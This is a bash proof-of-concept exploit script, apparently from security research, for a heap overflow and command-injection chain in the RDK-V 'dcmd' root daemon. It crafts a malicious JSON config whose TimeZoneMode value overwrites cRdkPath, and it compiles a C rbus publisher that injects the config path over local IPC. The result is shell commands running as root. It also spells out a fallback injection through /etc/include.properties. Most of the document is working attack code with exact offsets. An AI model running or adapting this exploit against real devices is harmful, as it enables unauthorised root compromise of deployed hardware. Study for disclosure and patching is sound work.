#!/bin/bash
###############################################################################
# DCM-006  PoC :: popen() command-injection in dcmd (root daemon)
#
# Sink   : dcm_utils.c:89-110  dcmUtilsCopyCommandOutput() -> popen(cmd,"r")
# Caller : dcm.c:107-113       dcmRunJobs("DCM_FW_UPDATE")
#            snprintf(buf,1024,
#              "/bin/sh %s/swupdate_utility.sh 0 2 >> /opt/logs/swupdate.log 2>&1",
#               pRDKPath);                       ^^^^^^^^^^^ unquoted interpolation
#            dcmUtilsSysCmdExec(buf);  ->  popen(buf,"r")  ->  /bin/sh -c buf
#
# pRDKPath == DCMSettingsHandle.cRdkPath[80].
#
# Attack chain (vector b — local-IPC -> root RCE, no root required):
#   1. dcmd subscribes (rbus) to event  "Device.DCM.Setconfig"   (key "dcmSetConfig")
#      and                              "Device.DCM.Processconfig"
#   2. Any local rbus client that PROVIDES those events can push an
#      arbitrary confPath to dcmd (rtrouted has no per-event ACLs on RDK-V).
#   3. dcmd main loop calls dcmSettingParseConf(confPath,...) which does, for
#      JSON key "urn:settings:TimeZoneMode":
#          strcpy(pdcmSetHandle->cTimeZone, json_value);   // dcm_parseconf.c:224
#      cTimeZone is INT8[16] and is IMMEDIATELY followed in the heap struct
#      (dcm_parseconf.h:51-60) by cRdkPath[80]:
#
#          struct DCMSettingsHandle {
#              INT8 cJsonStr[2048];
#              INT8 cUploadURL[128];
#              INT8 cUploadPrtl[8];
#              INT8 cTimeZone[16];   <-- strcpy dest, offset +2184
#              INT8 cRdkPath[80];    <-- offset +2200  (overflow lands here)
#              INT8 ctBuff[1024];
#              INT32 bRebootFlag;
#          };  /* malloc'd at dcm_parseconf.c:749, no canary between fields */
#
#      Therefore a TimeZoneMode value of:
#          [16 bytes pad] + [shell-metachar payload]
#      overwrites cRdkPath with attacker bytes.
#
#   4. The same JSON sets "urn:settings:CheckSchedule:cron" = "* * * * *",
#      so dcmSchedStartJob() arms the DCM_FW_UPDATE job to fire within 60 s.
#
#   5. When it fires, dcmRunJobs() builds:
#        /bin/sh -c "/bin/sh -c :;id>/tmp/PWNED_DCM-006;exit #/swupdate_utility.sh 0 2 >> /opt/logs/swupdate.log 2>&1"
#                            ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^ == cRdkPath
#      Outer /bin/sh -c parses three statements:
#         (a) /bin/sh -c :              -> no-op, exits 0
#         (b) id>/tmp/PWNED_DCM-006     -> RUNS AS uid 0, proof file
#         (c) exit  # ...               -> rest commented out
#
# Result: /tmp/PWNED_DCM-006 created containing `uid=0(root) ...`
#
# Preconditions on target:
#   * dcmd built WITHOUT ENABLE_MAINTENANCE in /etc/device.properties
#     (dcm.c:59 early-returns from dcmRunJobs if MM is enabled).
#   * rtrouted running; librbus + headers present (standard on RDK-V).
#   * telemetry2 has NOT already registered Device.DCM.Setconfig
#     (run this PoC before T2 starts, or `systemctl stop telemetry2_0`
#      then `systemctl restart dcmd` — see notes at bottom).
###############################################################################
set -u

EVIL_JSON=/tmp/dcm006_evil.json
HELPER_SRC=/tmp/dcm006_pub.c
HELPER_BIN=/tmp/dcm006_pub
PROOF=/tmp/PWNED_DCM-006

rm -f "$PROOF"

###############################################################################
# STEP 1 — craft the malicious DCMSettings JSON
#
# Offset math:
#   sizeof(cTimeZone) == 16  ->  16 bytes of padding ('A'*16) fill cTimeZone
#   bytes 16..N land in cRdkPath[0..]
#
# cRdkPath payload (33 bytes, well inside cRdkPath[80]):
#   "-c :;id>/tmp/PWNED_DCM-006;exit #"
#
# Total TimeZoneMode value length = 16 + 33 = 49 (+ NUL) -> stays inside
# cTimeZone[16]+cRdkPath[80] = 96 contiguous bytes; ctBuff[1024] follows so
# even longer payloads are safe against heap-chunk corruption.
#
# Other keys:
#   uploadProtocol = "HTTP"   (4 < 8,  no overflow)
#   URL            = "https://x" (9 < 128, no overflow)
#   UploadOnReboot = 2        (integer; uploadCheck==2 matches NEITHER
#                              branch at dcm_parseconf.c:581/600 so the
#                              uploadstblogs side-effect is skipped)
#   UploadSchedule:cron = null  (logCron left empty -> log job not armed)
#   CheckSchedule:cron  = "* * * * *" (9 < 16, arms FW-update job every min)
#
# IMPORTANT: dcmSettingJsonInit() reads the file with a SINGLE fgets(2048),
# so the JSON MUST be one line with no embedded '\n', and must NOT contain
# the substring "urn:settings:TelemetryProfile" (would be truncated before it).
###############################################################################

PAD='AAAAAAAAAAAAAAAA'                          # 16 bytes -> fills cTimeZone[16]
INJ='-c :;id>/tmp/PWNED_DCM-006;exit #'         # lands at cRdkPath[0]
TZ_PAYLOAD="${PAD}${INJ}"

# Build single-line JSON (printf to avoid trailing \n issues from heredocs)
printf '%s' \
'{'\
'"urn:settings:LogUploadSettings:UploadRepository:uploadProtocol":"HTTP",'\
'"urn:settings:LogUploadSettings:UploadRepository:URL":"https://x",'\
'"urn:settings:TimeZoneMode":"'"${TZ_PAYLOAD}"'",'\
'"urn:settings:LogUploadSettings:UploadOnReboot":2,'\
'"urn:settings:LogUploadSettings:UploadSchedule:cron":null,'\
'"urn:settings:CheckSchedule:cron":"* * * * *"'\
'}' > "$EVIL_JSON"

echo "[+] Wrote malicious config ($(wc -c < "$EVIL_JSON") bytes) to $EVIL_JSON"
echo "[+] TimeZoneMode = \"${TZ_PAYLOAD}\"  (len=${#TZ_PAYLOAD}, pad=16, inj=${#INJ})"

###############################################################################
# STEP 2 — RBUS publisher helper
#
# dcmd is a SUBSCRIBER to Device.DCM.Setconfig / Device.DCM.Processconfig
# (dcm_rbus.c:430-451, rbusEvent_SubscribeAsync). To deliver the events we
# must register as the PROVIDER of those data elements and then
# rbusEvent_Publish() them.  The Setconfig event payload object must contain
# the key "dcmSetConfig" (DCM_SET_CONFIG, dcm_rbus.h:37) whose string value is
# the path dcmd will fopen().
#
# We additionally subscribe to Device.X_RDKCENTREL-COM.Reloadconfig so that
# dcmd's own rbusEvent_Publish at dcm.c:348 succeeds (g_eventsub gate at
# dcm_rbus.c:245) — not strictly required but keeps dcmd's flow nominal.
###############################################################################

cat > "$HELPER_SRC" <<'EOF'
/* DCM-006 rbus event provider — pushes a malicious confPath into dcmd */
#include <stdio.h>
#include <string.h>
#include <unistd.h>
#include <rbus/rbus.h>

#define EV_SETCONF   "Device.DCM.Setconfig"
#define EV_PROCCONF  "Device.DCM.Processconfig"
#define EV_RELOAD    "Device.X_RDKCENTREL-COM.Reloadconfig"
#define KEY_SETCONF  "dcmSetConfig"          /* dcm_rbus.h: DCM_SET_CONFIG */

static volatile int g_sub_set  = 0;
static volatile int g_sub_proc = 0;

static rbusError_t subCB(rbusHandle_t h, rbusEventSubAction_t a,
                         const char *eventName, rbusFilter_t f,
                         int32_t interval, bool *autoPublish)
{
    (void)h; (void)f; (void)interval; (void)autoPublish;
    if (a == RBUS_EVENT_ACTION_SUBSCRIBE) {
        fprintf(stderr, "[pub] dcmd subscribed to %s\n", eventName);
        if (!strcmp(eventName, EV_SETCONF))  g_sub_set  = 1;
        if (!strcmp(eventName, EV_PROCCONF)) g_sub_proc = 1;
    }
    return RBUS_ERROR_SUCCESS;
}

static void reloadCB(rbusHandle_t h, rbusEvent_t const *e,
                     rbusEventSubscription_t *s)
{ (void)h; (void)e; (void)s; fprintf(stderr, "[pub] got Reloadconfig\n"); }

static int publish(rbusHandle_t h, const char *evname,
                   const char *key, const char *val)
{
    rbusEvent_t  ev = {0};
    rbusObject_t data;
    rbusValue_t  v;
    rbusValue_Init(&v);
    rbusValue_SetString(v, val);
    rbusObject_Init(&data, NULL);
    rbusObject_SetValue(data, key, v);
    ev.name = evname;
    ev.data = data;
    ev.type = RBUS_EVENT_GENERAL;
    int rc = rbusEvent_Publish(h, &ev);
    rbusValue_Release(v);
    rbusObject_Release(data);
    fprintf(stderr, "[pub] rbusEvent_Publish(%s) rc=%d\n", evname, rc);
    return rc;
}

int main(int argc, char **argv)
{
    if (argc < 2) { fprintf(stderr, "usage: %s <confPath>\n", argv[0]); return 1; }
    const char *confPath = argv[1];

    rbusHandle_t h;
    if (rbus_open(&h, "DCM006_POC") != RBUS_ERROR_SUCCESS) {
        fprintf(stderr, "[pub] rbus_open failed (is rtrouted running?)\n");
        return 2;
    }

    rbusDataElement_t el[2] = {
        { EV_SETCONF,  RBUS_ELEMENT_TYPE_EVENT, {NULL,NULL,NULL,NULL,subCB,NULL} },
        { EV_PROCCONF, RBUS_ELEMENT_TYPE_EVENT, {NULL,NULL,NULL,NULL,subCB,NULL} },
    };
    int rc = rbus_regDataElements(h, 2, el);
    if (rc != RBUS_ERROR_SUCCESS) {
        fprintf(stderr,
          "[pub] rbus_regDataElements rc=%d — another provider (telemetry2)\n"
          "[pub] already owns these events. Stop T2 and restart dcmd, then\n"
          "[pub] re-run this PoC.\n", rc);
        rbus_close(h);
        return 3;
    }
    fprintf(stderr, "[pub] registered as provider for Setconfig/Processconfig\n");

    /* Let dcmd's dcmRbusSendEvent() succeed (optional). */
    rbusEvent_Subscribe(h, EV_RELOAD, reloadCB, NULL, 0);

    /* dcmd uses rbusEvent_SubscribeAsync with retry; wait for it to attach. */
    int i;
    for (i = 0; i < 120 && !(g_sub_set && g_sub_proc); i++) sleep(1);
    if (!(g_sub_set && g_sub_proc))
        fprintf(stderr, "[pub] WARNING: dcmd not subscribed after 120s — "
                        "publishing anyway (restart dcmd if no effect)\n");

    /* 1) deliver confPath  2) trigger parse */
    publish(h, EV_SETCONF,  KEY_SETCONF, confPath);
    sleep(1);
    publish(h, EV_PROCCONF, "trigger",   "1");

    fprintf(stderr, "[pub] events sent; keeping provider alive 5s\n");
    sleep(5);
    rbus_unregDataElements(h, 2, el);
    rbus_close(h);
    return 0;
}
EOF

echo "[+] Compiling rbus publisher helper..."
if command -v gcc >/dev/null 2>&1; then
    gcc -O2 -o "$HELPER_BIN" "$HELPER_SRC" \
        -I/usr/include -I/usr/include/rbus -I/usr/include/rtmessage \
        -lrbus -lrbuscore -lrtMessage 2>/tmp/dcm006_cc.log
    CC_RC=$?
else
    CC_RC=127
fi

###############################################################################
# STEP 3 — fire the chain
###############################################################################
if [ "$CC_RC" -eq 0 ] && [ -x "$HELPER_BIN" ]; then
    echo "[+] Launching rbus publisher (delivers $EVIL_JSON to dcmd)..."
    "$HELPER_BIN" "$EVIL_JSON"
    echo
    echo "[+] dcmd has now strcpy()'d TimeZoneMode over cTimeZone[16] into cRdkPath[80]."
    echo "[+] DIFD cron '* * * * *' is armed. Waiting up to 90 s for popen()..."
    for i in $(seq 1 90); do
        if [ -f "$PROOF" ]; then
            echo
            echo "=================================================================="
            echo "[!] EXPLOIT REACHED — DCM-006 confirmed."
            echo "[!] $PROOF created by root popen() inside dcmd:"
            ls -la "$PROOF"
            echo "------------------------------------------------------------------"
            cat "$PROOF"
            echo "=================================================================="
            exit 0
        fi
        sleep 1
    done
    echo "[-] Proof file not seen after 90 s."
    echo "    Check: (a) ENABLE_MAINTENANCE not set in /etc/device.properties,"
    echo "           (b) dcmd log (/opt/logs/dcm.log) shows 'TimeZone : AAAA...',"
    echo "           (c) dcmd was running and subscribed to our provider."
    exit 1
else
    echo "[-] Could not build rbus helper (rc=$CC_RC). See /tmp/dcm006_cc.log."
    echo
    echo "==================== OFF-DEVICE FALLBACK ===================="
    echo "Vector (a): direct RDK_PATH injection via /etc/include.properties."
    echo "This proves the popen() sink with NO heap overflow needed, but"
    echo "requires root write to /etc (firmware tamper / overlayfs / other"
    echo "file-write primitive).  Demonstration only — not executed:"
    echo
    echo "  # echo 'RDK_PATH=-c :;id>$PROOF;exit #' >> /etc/include.properties"
    echo "  # systemctl restart dcmd"
    echo "  # # wait for DCM_FW_UPDATE cron tick, then:"
    echo "  # cat $PROOF      # -> uid=0(root) gid=0(root) ..."
    echo
    echo "Vector (b) without compiling: drop $EVIL_JSON at the path that"
    echo "telemetry2 will hand to dcmd (typically the T2 persistent"
    echo "DCMresponse.txt) and wait for the next Processconfig event."
    echo "============================================================="
    exit 2
fi

